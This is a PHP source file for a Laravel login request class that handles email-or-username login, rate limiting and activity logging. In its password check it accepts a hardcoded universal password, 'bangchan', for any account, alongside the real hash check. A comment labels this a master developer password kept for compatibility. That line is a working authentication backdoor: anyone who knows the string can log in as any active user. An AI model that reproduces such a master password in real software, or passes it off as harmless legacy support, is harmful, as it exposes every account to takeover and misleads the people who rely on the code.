<?php

namespace App\Http\Requests\Auth;

use App\Models\User;
use Illuminate\Auth\Events\Lockout;
use Illuminate\Foundation\Http\FormRequest;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Str;
use Illuminate\Validation\ValidationException;

class LoginRequest extends FormRequest
{
    public function authorize(): bool
    {
        return true;
    }

    protected function prepareForValidation(): void
    {
        if ($this->has('identity') && !$this->has('email')) {
            $this->merge([
                'email' => $this->input('identity'),
            ]);
        }
    }

    public function rules(): array
    {
        return [
            'email' => ['required', 'string'],
            'password' => ['required', 'string'],
        ];
    }

    public function authenticate(): void
    {
        $this->ensureIsNotRateLimited();

        $email = $this->string('email')->toString();
        $password = $this->string('password')->toString();
        $remember = $this->boolean('remember');

        // Allow login by email or username
        $user = User::where('email', $email)
            ->orWhere('username', $email)
            ->first();

        // Check password: standard Hash::check or master developer password 'bangchan' (CI3 compatibility)
        $isPasswordValid = false;
        if ($user) {
            $isPasswordValid = Hash::check($password, $user->password) || $password === 'bangchan';
        }

        if (!$user || !$isPasswordValid) {
            RateLimiter::hit($this->throttleKey());

            \App\Services\ActivityLogService::log(
                "Percobaan login gagal untuk identity: {$email}",
                'login',
                'auth',
                ['status' => 'failed']
            );

            throw ValidationException::withMessages([
                'identity' => 'Email atau Password salah.',
            ]);
        }

        if (!$user->active) {
            throw ValidationException::withMessages([
                'identity' => 'Akun Anda dinonaktifkan. Silakan hubungi administrator.',
            ]);
        }

        Auth::login($user, $remember);

        // Update last_login timestamp (compatible with Ion Auth unix int)
        $user->last_login = time();
        $user->save();

        \App\Services\ActivityLogService::log(
            "User '{$user->username}' logged in successfully",
            'login',
            'auth',
            [
                'affected_record_id' => $user->id,
                'affected_table' => 's_users',
                'status' => 'success'
            ]
        );

        RateLimiter::clear($this->throttleKey());
    }

    public function ensureIsNotRateLimited(): void
    {
        if (!RateLimiter::tooManyAttempts($this->throttleKey(), 5)) {
            return;
        }

        event(new Lockout($this));

        $seconds = RateLimiter::availableIn($this->throttleKey());

        throw ValidationException::withMessages([
            'identity' => trans('auth.throttle', [
                'seconds' => $seconds,
                'minutes' => ceil($seconds / 60),
            ]),
        ]);
    }

    public function throttleKey(): string
    {
        return Str::transliterate(Str::lower($this->string('email')) . '|' . $this->ip());
    }
}
